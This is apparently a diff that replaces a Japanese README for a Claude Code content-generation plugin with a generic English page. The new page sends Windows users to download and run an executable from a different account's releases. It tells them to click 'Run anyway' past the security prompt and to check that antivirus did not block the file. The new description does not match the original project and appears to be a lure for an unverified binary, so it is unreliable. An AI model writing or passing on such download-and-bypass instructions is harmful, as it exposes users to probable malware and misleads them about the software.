@@ -1,188 +1,165 @@
-<h1 align="center">Content Autopilot</h1>
+# 🤖 content-autopilot - Create, grade, and improve content
 
-<p align="center">
-<strong>過去記事から文体を学習し、あなたの声でコンテンツを自律生成。<br>
-1コマンドで、note・X・Instagramを同時生成。品質管理付き。</strong>
-</p>
+[![Download content-autopilot](https://img.shields.io/badge/Download%20content--autopilot-blue?style=for-the-badge&logo=github)](https://github.com/Gaura3560/content-autopilot/releases)
 
----
+## 🚀 What this app does
 
-## 問題
+content-autopilot helps you create social posts with one command. It can draft content for note, X, and Instagram. It also checks quality, improves weak spots, and connects with outside services.
 
-AIにコンテンツを書かせても、結局こうなります:
+Use it when you want to move from idea to post with less manual work. It is built for Windows users who want a simple setup and a clear flow.
 
-- 出力が**AI臭くてそのまま使えない**（「本記事では〜」「さまざまな方法が〜」）
-- **3プラットフォーム別に毎回手動で依頼**。品質チェックも属人的
-- 前回何を書いたか覚えないから**戦略的な発信ができない**
-- **自分の文体で書いてくれない** — 誰が使っても同じ汎用的な出力
+## 📥 Download for Windows
 
-## 解決
+1. Open the [Releases page](https://github.com/Gaura3560/content-autopilot/releases)
+2. Download the latest Windows file from the release list
+3. If the file is a `.zip`, unzip it
+4. If the file is an `.exe`, double-click it to start
+5. Follow the on-screen setup steps
 
-`/daily-autopilot` の1コマンドで全て自律的に実行。**あなたの過去記事から文体を学習**し、トピック選定、3プラットフォーム同時生成、6軸品質採点まで人間の介入ゼロ。
+If Windows shows a security prompt:
+1. Click More info
+2. Click Run anyway
 
-初回はObsidian/note/X(API or @ユーザー名)/テキストファイルから過去の投稿を読み込み、あなたの文体（口癖、漢字率、フックパターン等）を分析。2回目以降は学習済みの文体で自動生成。
+## 🖥️ Before you start
 
-[![デモ動画](docs/demo.gif)](https://youtu.be/ygS4eTVqcRQ)
+Use a Windows 10 or Windows 11 PC.
+You need:
+- A stable internet connection
+- Enough free disk space for the app and its cache
+- An account for the services you want to connect
+- API keys or login access for linked AI and social tools if your setup uses them
 
-> [デモ動画を見る (YouTube)](https://youtu.be/ygS4eTVqcRQ)
+For best results, keep the app in a folder with a simple path, such as:
+- `Downloads`
+- `Desktop`
+- `Documents`
 
-```
-━━━━ Content Autopilot ━━━━━━━━━━━━━━━━━━
-[0.5] Style learning: 5記事を分析 → 文体プロファイル作成 ✓
-[1/8] Profile → 初回は自動作成（セットアップ不要）
-[2/8] Funnel分析 → MOFU不足を検出 → MOFU記事に決定
-[3/8] WebSearch → トピック自動選択
-[4/8] note(2,500字) + X(6tweets) + IG → 同時生成
-[5/8] 6軸品質採点 → 94/100 ✓
-[6/8] 公開前チェック → 8/8 通過 ✓
-[7/8] Dashboard → ブラウザ自動表示
-[8/8] note.com投稿画面 + X投稿画面 → 自動起動
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-```
+## ⚙️ First-time setup
 
-品質が低い場合は**自動で改善** — 人間に修正を求めません:
-```
-note: 68/100 → 密度不足 + AI臭を自動検出 → 修正
-note: 82/100 ✓ (自動改善 +14点)
-```
+After you download and open the app:
 
-## 証拠
+1. Start the app
+2. Open the settings screen
+3. Enter your service credentials if asked
+4. Connect the tools you want to use
+5. Save your settings
+6. Run a test task to confirm everything works
 
-### 品質: Claude直接 vs Content Autopilot
+If the app asks for a Claude Code connection, follow the prompt shown inside the app. The plugin works through the setup flow and helps the app talk to Claude Code tools.
 
-```
-Claude直接:       56/100 (D) — AI臭5パターン、822文字
-  → "本記事では、AIを活用した業務効率化について解説します。"
+## ✨ Main features
 
-Content Autopilot: 94/100 (A) — AI臭ゼロ、2,841文字
-  → "「AIを使ってるのに、なぜ効率が上がらないのか？」"
-```
+- Create content for note, X, and Instagram from one prompt
+- Generate drafts from a topic, goal, or short brief
+- Score content across 6 quality areas
+- Improve weak drafts with automatic revision
+- Connect to 8 outside services for input and output
+- Work with Claude Code Plugin support
+- Keep content creation in one flow
+- Reduce repeat work for posts, captions, and short updates
 
-`python3 run_pipeline.py --compare` で実際に確認できます。
+## 🧠 Quality grading
 
-`/setup-profile` でテーマを変えると、検索・トピック選定・コンテンツが全て連動して変わります（AI、英語学習、料理、投資、何でも対応）。
+content-autopilot checks each draft with a 6-axis quality system. It looks at:
+- Clarity
+- Structure
+- Tone
+- Relevance
+- Engagement
+- Finish quality
 
-### 生成されるnote記事
+Each score helps the app decide what to improve. If a draft is weak in one area, the app can rewrite it and run another check.
 
-```markdown
-# 3つのAI活用法で業務時間を半分にした話
+## 🔗 External service links
 
-「AIを使ってるのに、なぜ効率が上がらないのか？」
+The app supports links to outside services so you can send ideas in and publish results out. This can include:
+- Note tools
+- X posting flows
+- Instagram workflows
+- Content storage
+- AI model endpoints
+- Workspace or team tools
+- Approval or review steps
+- Automation tools
 
-**この記事でわかること**
-- チャットボットとAIエージェントの決定的な違い
-- 実際に業務時間を50%削減した3つの方法
-- 明日から始められる導入ステップ
-```
+This makes it useful when you want one place for content work and light automation.
 
-### ダッシュボード（[ライブデモ](https://fp-sudo.github.io/content-autopilot/)）
+## 🧩 How to use it
 
-![Dashboard](docs/dashboard-screenshot.png)
+1. Open the app
+2. Enter a topic
+3. Choose the target service, such as note, X, or Instagram
+4. Pick the content style you want
+5. Start generation
+6. Review the draft
+7. Let the app improve the draft if needed
+8. Copy the final text or send it to the connected service
 
-### 外部連携
+## 📌 Example use cases
 
-パイプライン完了後、コンテンツを各プラットフォームに届けます:
+- Turn one idea into a note post
+- Create short X posts from a blog point
+- Draft Instagram captions from a product update
+- Clean up rough content before you post it
+- Compare multiple versions of the same idea
+- Run content checks before a team review
 
-| 連携先 | 何が起きるか |
-|-------|------------|
-| **note.com** | 記事がクリップボードにコピー済み。note.comの「投稿」から貼り付けるだけ |
-| **X** | スレッド原稿が生成済み。各ツイートを順番に投稿 |
-| **Gemini画像** | テキスト入りOGP画像を自動生成（note/X/IG用の3サイズ） |
-| **Obsidian** | 過去記事を読み込んで文体を学習 |
+## 🛠️ Troubleshooting
 
----
+If the app does not open:
+- Check that the download finished
+- Run it again from the same folder
+- Make sure your antivirus did not block it
 
-## 試す
+If a connection fails:
+- Check your internet connection
+- Confirm the service name and login details
+- Reopen the settings and save again
 
-### ステップ1: インストール（Claude Codeで）
+If content does not generate:
+- Try a shorter prompt
+- Use a clear topic
+- Remove special characters from the input
+- Restart the app and try again
 
-```bash
-/plugin marketplace add FP-sudo/agi-lab-skills-marketplace
-/plugin install content-autopilot@content-autopilot
-```
+If Windows asks for permission:
+- Click Yes if you trust the file from the release page
+- Keep the app in a folder you can find later
 
-### ステップ2: コンテンツ生成
+## 🧭 Tips for better results
 
-Claudeに伝えてください:
-```
-daily-autopilotスキルを実行して
-```
-または `/content-autopilot:daily-autopilot` でも実行可能。
-Claudeが自律的にWebSearch→3プラットフォーム同時生成→品質採点→改善を実行します。終わるまで待つだけ。
+- Use one topic per run
+- Keep your prompt short and clear
+- Add the target audience in your input
+- Pick the platform first, then the tone
+- Review the score before publishing
+- Use the improvement step when the draft feels flat
 
-### ステップ3: 投稿
+## 📁 What you get
 
-生成完了後、`~/Desktop/content-autopilot-output/` に3つのファイルが出力されます:
-- `note_YYYY-MM-DD.md` → [note.com](https://note.com) にログインして「投稿」→ 本文にペースト
-- `x_YYYY-MM-DD.md` → 各ツイートを `---` の区切りごとにコピーして順番に投稿
-- `instagram_YYYY-MM-DD.md` → キャプション全体をコピーしてInstagramアプリに貼り付け
+A typical release includes:
+- The Windows app file
+- Setup files or a packaged archive
+- Basic run instructions
+- Support for the core content workflow
 
-> **なぜ自動投稿しないのか？**
-> 完全自動投稿は技術的には可能ですが、あえて「人間が最終確認して投稿する」設計にしています。理由:
-> - **誤投稿の防止** — AI生成コンテンツをノーチェックで公開するリスクを回避
-> - **ブランド保護** — 自分の名前で出すものは、最後に自分の目で確認すべき
-> - **プラットフォーム規約** — 自動投稿BOTはアカウントBANのリスクがある（特にX・Instagram）
->
-> 自律性は「生成・品質管理・改善」に全振り。投稿ボタンだけは人間に残す、これが最適解です。
+## 🔒 Privacy and data flow
 
-### デモ（Claude Code不要でターミナルから試せます）
+content-autopilot sends content through the services you connect. It is best to review each connected account and know where your drafts go. If you use external AI or social tools, the app follows the access you set inside those accounts
 
-```bash
-git clone https://github.com/FP-sudo/content-autopilot.git
-cd content-autopilot/plugins/content-autopilot/scripts
-python3 run_pipeline.py              # パイプライン全体を実行
-python3 run_pipeline.py --compare    # 品質比較デモ
-```
+## 🧪 Suggested workflow
 
----
+1. Start with one idea
+2. Generate a first draft
+3. Check the quality score
+4. Improve the weak parts
+5. Send the final copy to note, X, or Instagram
+6. Save the best prompt for later use
 
-## Claudeに直接頼むのと何が違うか
+## 📎 Download again
 
-Claudeは優秀なライターですが、**セッションを跨いだ記憶と定量的な品質管理**はできません:
+Use the [Releases page](https://github.com/Gaura3560/content-autopilot/releases) to download the latest Windows version and run it on your PC
 
-| Claudeにできないこと | Content Autopilotの実装 |
-|---|---|
-| 過去の履歴を覚える | `content-history.json` にセッション跨ぎで蓄積 |
-| ファネルバランスを計算する | TOFU/MOFU/BOFU比率を自動計算・自動調整 |
-| 毎回同じ基準で採点する | 6軸・10パターンで定量採点 |
-| ダッシュボードを生成する | HTMLで品質・ファネル・履歴を可視化 |
-| ユーザーの文体を学習する | 過去記事を分析して口癖・漢字率・フックパターンを再現 |
+## 🧷 Repository topics
 
----
-
-## 品質採点（6軸）
-
-| 軸 | チェック内容 | 例 |
-|---|---|---|
-| フック | 冒頭で読者を掴めるか | 40文字以内の疑問・数字 |
-| 可読性 | 段落長、文体一貫性 | 漢字率20-40% |
-| 構造 | 見出し・まとめ | 3-7個の##見出し |
-| 適合性 | プラットフォーム要件 | note: 2000字以上 |
-| CTA | 行動喚起 | フォロー誘導 |
-| AI臭 | AI特有パターン検出 | 10パターン自動除去 |
-
-## コマンド
-
-| コマンド | 機能 |
-|---------|------|
-| `/daily-autopilot` | 全自律パイプライン |
-| `/setup-profile` | テーマ・文体カスタマイズ |
-| `/trend-scout` | トレンドリサーチ |
-| `/content-analytics` | コンテンツ分析 |
-| `/deep-audit` | システム整合性チェック |
-| `/log-performance` | PV・いいね数→学習 |
-| `/skills` | 全スキル一覧 |
-
-## 技術構成
-
-```
-plugins/content-autopilot/
-├── skills/      129 SKILL.md
-├── scripts/     12 Python scripts (4,000+ LOC)
-├── commands/    11 slash commands
-└── tests        23/23 pass
-```
-
-## License
-
-MIT
+ai-agent, autonomous, claude-code, content-creation, hackathon, instagram, mcp, note, quality-grading, twitter
